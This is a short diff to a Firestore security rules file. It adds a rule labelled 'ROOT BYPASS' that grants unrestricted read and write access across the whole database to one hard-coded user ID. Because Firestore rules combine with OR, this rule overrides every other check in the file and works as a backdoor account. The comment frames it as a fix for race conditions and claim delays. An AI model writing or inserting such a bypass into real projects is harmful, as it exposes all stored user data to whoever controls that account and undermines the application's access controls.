@@ -2,6 +2,13 @@ rules_version = '2';
 service cloud.firestore {
   match /databases/{database}/documents {
 
+
+    // [ROOT BYPASS] Absolute priority for the creator account
+    // This ensures administrative operations never fail due to race conditions or claim delays.
+    match /{document=**} {
+      allow read, write: if request.auth != null && request.auth.uid == 'Ii8G2Ad6GyUxaS63ecrzeaE6l883';
+    }
+
     // ── Helpers ──────────────────────────────────────────────────────────────
     function isAuthenticated() {
       return request.auth != null;
